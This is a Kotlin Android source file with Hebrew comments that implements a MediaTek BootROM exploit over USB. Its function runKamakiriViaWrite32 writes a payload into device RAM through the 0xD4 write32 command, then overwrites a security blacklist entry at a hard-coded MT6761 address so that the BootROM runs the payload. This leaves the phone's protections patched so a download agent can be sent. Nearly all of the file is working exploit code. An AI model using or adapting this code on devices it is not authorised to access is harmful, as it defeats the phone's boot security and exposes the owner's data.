package com.example.mtkusbtool

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbEndpoint
import android.hardware.usb.UsbManager
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.Locale

object MtkBromConnection {

    // כתיבת 4 בייטים לזיכרון (0xD4)
    private fun write32(connection: android.hardware.usb.UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Int, values: IntArray): Boolean {
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD4.toByte()), 1, 2000) < 0) return false
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array()
        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
        val sizeBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(values.size).array()
        if (connection.bulkTransfer(epOut, sizeBytes, 4, 2000) < 0) return false
        
        // ACK
        val ack = ByteArray(1)
        connection.bulkTransfer(epIn, ack, 1, 2000)
        
        // שליחת הנתונים (כל ערך הוא 4 בייטים)
        for (v in values) {
            val vBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(v).array()
            if (connection.bulkTransfer(epOut, vBytes, 4, 2000) < 0) return false
        }
        return true
    }

    // "קפיצה" להרצה (0xD5)
    private fun jumpTo(connection: android.hardware.usb.UsbDeviceConnection, epOut: UsbEndpoint, epIn: UsbEndpoint, addr: Int): Boolean {
        if (connection.bulkTransfer(epOut, byteArrayOf(0xD5.toByte()), 1, 2000) < 0) return false
        val addrBytes = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(addr).array()
        if (connection.bulkTransfer(epOut, addrBytes, 4, 2000) < 0) return false
        val ack = ByteArray(2)
        connection.bulkTransfer(epIn, ack, 2, 2000)
        return true
    }

    fun runKamakiriViaWrite32(
        usbManager: UsbManager,
        device: UsbDevice,
        payloadBytes: ByteArray,
        onProgress: (String) -> Unit
    ): String {
        val connection = usbManager.openDevice(device) ?: return "שגיאה: פתיחת חיבור נכשלה."

        var epIn: UsbEndpoint? = null
        var epOut: UsbEndpoint? = null
        for (i in 0 until device.interfaceCount) {
            val usbInterface = device.getInterface(i)
            if (connection.claimInterface(usbInterface, true)) {
                for (j in 0 until usbInterface.endpointCount) {
                    val ep = usbInterface.getEndpoint(j)
                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
                    }
                }
                if (epIn != null && epOut != null) break
            }
        }

        if (epIn == null || epOut == null) { connection.close(); return "שגיאה: לא נמצאו נקודות קצה." }

        // 1. כתיבת ה-Payload לזיכרון (כל 4 בייטים)
        onProgress("כותב Payload ל-RAM (${payloadBytes.size} בייט)...")
        val payloadAddr = 0x100A00 // כתובת ה-Payload ב-BROM
        var offset = 0
        while (offset < payloadBytes.size) {
            val chunk = payloadBytes.copyOfRange(offset, minOf(offset + 4, payloadBytes.size))
            // המרה ל-Int (Big Endian)
            val value = ByteBuffer.wrap(chunk + ByteArray(4 - chunk.size)).order(ByteOrder.BIG_ENDIAN).int
            if (!write32(connection, epOut, epIn, payloadAddr + offset, intArrayOf(value))) {
                connection.close()
                return "שגיאה בכתיבת Payload ב-offset $offset"
            }
            offset += 4
            if (offset % 400 == 0) onProgress("התקדמות: ${(offset * 100) / payloadBytes.size}%")
        }

        // 2. הרצת ה-Payload (כתיבה לכתובת ה-blacklist)
        onProgress("מריץ Payload...")
        val blacklistAddr = 0x102868 // blacklist[0][0] + 0x40 עבור MT6761
        if (!write32(connection, epOut, epIn, blacklistAddr, intArrayOf(payloadAddr))) {
            connection.close()
            return "שגיאה בהרצת Payload."
        }

        // 3. (אופציונלי) שליחת DA עכשיו, כשה-Patch פעיל
        onProgress("Payload הורץ. החיבור נשאר חי. אפשר לשלוח DA.")
        
        connection.close()
        return "הצלחה! ה-Payload נכתב והורץ."
    }
}
